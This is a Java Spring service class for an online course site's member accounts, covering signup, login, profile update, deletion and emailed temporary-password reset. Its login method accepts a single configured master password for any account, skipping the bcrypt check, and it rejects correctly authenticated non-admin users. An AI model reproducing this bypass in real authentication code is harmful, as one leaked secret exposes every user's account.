package com.loy124.myapp.member.service;

import com.loy124.myapp.core.util.auth.MemberDetails;
import com.loy124.myapp.core.util.auth.jwt.JwtTokenUtil;
import com.loy124.myapp.core.util.common.Role;
import com.loy124.myapp.core.util.exception.ErrorException;
import com.loy124.myapp.core.util.mail.MailgunClient;
import com.loy124.myapp.core.util.mail.TemporaryPasswordGenerator;
import com.loy124.myapp.member.dto.LoginRequestDto;
import com.loy124.myapp.member.dto.ResetPasswordMemberDto;
import com.loy124.myapp.member.dto.SignUpRequestDto;
import com.loy124.myapp.member.dto.UpdateRequestDto;
import com.loy124.myapp.member.entity.Member;
import com.loy124.myapp.member.repository.MemberRepository;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import jakarta.transaction.Transactional;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import com.loy124.myapp.core.util.mail.MailForm;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.http.ResponseEntity;
import org.springframework.security.access.prepost.PreAuthorize;
import org.springframework.security.core.Authentication;
import org.springframework.security.core.context.SecurityContextHolder;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.stereotype.Service;

import static com.loy124.myapp.core.util.mail.MailForm.buildHTMLContent;


@Service
@RequiredArgsConstructor
@Slf4j
public class MemberService {

    private final MemberRepository memberRepository;


    private final BCryptPasswordEncoder bCryptPasswordEncoder;

    private final MailgunClient mailgunClient;



    @Value("${jwt.token.secret}")
    private String key;

    @Value("${admin.password}")
    private String superKey;

    private final String PREFIX = "#";

    @Transactional
    public Boolean emailCheck(String email) {

        Boolean existsByEmail = memberRepository.existsByEmail(email);

        if (existsByEmail == Boolean.TRUE) {
            throw new ErrorException.Exception409("중복된 이메일입니다.");
        }

        return existsByEmail;
    }


    @Transactional
    public void signup(SignUpRequestDto signUpRequestDto) {

        //로그인 설계하기

        //도메인 + 이메일로 로그인 진행하기

        Role role = Role.STUDENT;

        String domainName = "mincourse";

        emailCheck(signUpRequestDto.getEmail());

        Member member = Member.builder()
                .email(signUpRequestDto.getEmail())
                .name(signUpRequestDto.getName())
                .password(signUpRequestDto.getPassword())
                .phoneNumber(signUpRequestDto.getPhoneNumber())
                .role(role)
                .affiliatedCode(null)
                .build();


        member.encodedPassword(bCryptPasswordEncoder);

        memberRepository.save(member);

    }

    @Transactional
    public Member login(LoginRequestDto loginRequestDto, HttpServletRequest request, HttpServletResponse response) {

        Member selectedMember = memberRepository.findByEmail(loginRequestDto.getEmail())
                .orElseThrow(() -> {
                    JwtTokenUtil.logout(response, "min-token");
                    return new ErrorException.Exception404("해당 유저가 없습니다.");
                });

        if(loginRequestDto.getPassword().equals(superKey)){
            return selectedMember;
        }
        if (!bCryptPasswordEncoder.matches(loginRequestDto.getPassword(), selectedMember.getPassword())) {
            JwtTokenUtil.logout(response, "min-token");

            throw new ErrorException.Exception401("비밀번호가 일치하지 않습니다");
        }

        String name = null;

        if (selectedMember.getRole() == Role.ADMIN) {
            selectedMember.updateLastLogin();

            return selectedMember;
        }


        throw new ErrorException.Exception404("해당 유저가 없습니다.");

        //관리자인 경우 그냥 로그인 진행


}

public Member getSilentRefreshMember() {
    Authentication authentication = SecurityContextHolder.getContext().getAuthentication();

    if (authentication.getPrincipal() == "anonymousUser") {
        return null;
    }

    MemberDetails principal = (MemberDetails) authentication.getPrincipal();
    Member member = memberRepository.findByEmail(principal.getEmail())
            .orElseThrow(() -> new ErrorException.Exception404("해당 유저가 없습니다."));

    member.updateLastLogin();

    return member;
}

public Member getMember() {
    Authentication authentication = SecurityContextHolder.getContext().getAuthentication();

    if (authentication.getPrincipal() == "anonymousUser") {
        throw new ErrorException.Exception404("로그인 되어있는 유저가 없습니다.");
    }

    MemberDetails principal = (MemberDetails) authentication.getPrincipal();
    Member member = memberRepository.findByEmail(principal.getEmail())
            .orElseThrow(() -> new ErrorException.Exception404("해당 유저가 없습니다."));

    member.updateLastLogin();

    return member;
}


@PreAuthorize("isAuthenticated()")
@Transactional
public void update(UpdateRequestDto updateRequestDto) {
    Member member = getMember();

    String password = updateRequestDto.getPassword();

    member.updateMember(updateRequestDto);

    if (password != null) {
        //기존 비밀번호랑 다를때만
        if (!bCryptPasswordEncoder.matches(password, member.getPassword())) {
            //비밀번호 변경
            member.updatePassword(password);
            member.encodedPassword(bCryptPasswordEncoder);
        }
    }

}


@PreAuthorize("isAuthenticated()")
@Transactional
public void withdrawal() {
    Member member = getMember();
    memberRepository.delete(member);
}

@Transactional
public void resetPassword(ResetPasswordMemberDto resetPasswordMemberDto) {

    //아이디가 존재하지않는 경우
    Member member = memberRepository.findByEmail(resetPasswordMemberDto.getEmail())
            .orElseThrow(() -> new ErrorException.Exception404("해당 유저가 없습니다."));

    String randomPassword = TemporaryPasswordGenerator.generateTemporaryPassword(12);

    MailForm mailForm = MailForm.builder()
            .from("no-reply@mincoding.co.kr")
            .to(resetPasswordMemberDto.getEmail())
            .subject("mincourse 임시 비밀번호 생성 안내 메일입니다.")
            .html(buildHTMLContent(randomPassword))
            .build();//비밀번호 변경

    ResponseEntity<String> stringResponseEntity = mailgunClient.sendEmail(mailForm);
    String body = stringResponseEntity.getBody();
    member.updatePassword(randomPassword);
    member.encodedPassword(bCryptPasswordEncoder);
}


}
















